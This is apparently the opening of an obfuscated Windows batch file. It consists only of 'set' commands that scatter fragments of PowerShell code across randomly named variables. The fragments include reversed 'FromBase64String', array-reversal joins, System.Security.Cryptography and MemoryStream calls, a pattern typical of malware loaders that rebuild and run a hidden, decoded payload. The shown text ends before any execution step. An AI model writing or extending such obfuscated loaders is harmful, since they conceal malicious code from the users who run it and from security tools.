@echo off
set "kSCMOXiDZB=QbSO"
set "KHbnScpxro=cVjG"
set "lClyEODhsJ=u, 0"
set "dbTXVRMxjG=Gokv"
set "rRFTbAQzYi=ct S"
set "pEOzMSlbZL=y.Cr"
set "UiTkeNTeWF=bjec"
set "UPuAkQyiOJ=('%*'"
set "beKCLtpxkf=..-1"
set "psXFZAczbO= = N"
set "ozAYIZEGWD=; };"
set "UsTpTdzHNj=)))"
set "bFiAFsFoWK=gnir"
set "yRnwUqzbms=rtS4"
set "BlmItxaWfN= [Sy"
set "XfjmlQjdot=)) {"
set "KXFEUROfzY=[Sys"
set "TCqNGxpdAO=e]::"
set "IElhHEHTSN=am;$"
set "WYcPsmRujA='[-1"
set "neszYrZIPf=n ''"
set "QdgGETDGiu=();$"
set "XnzvFLztsc=Nn.D"
set "DtSWrOUwla=$jJl"
set "LnqBFFwtVk=tem."
set "EhtaAjVqTL=e = "
set "gISAFfwIgo=form"
set "JoZWiblPlM=pw.T"
set "CSxpFvWUOP=-joi"
set "iJoWRtbqav='gni"
set "UrpLBAHLKg=$gfy"
set "fxRWgNylhd=1] -"
set "ecQDiELuNF=.Cop"
set "INoXQEdOdU=[Sys"
set "xwCDxHtlbV=yTo("
set "MQezxRJltQ=isfL"
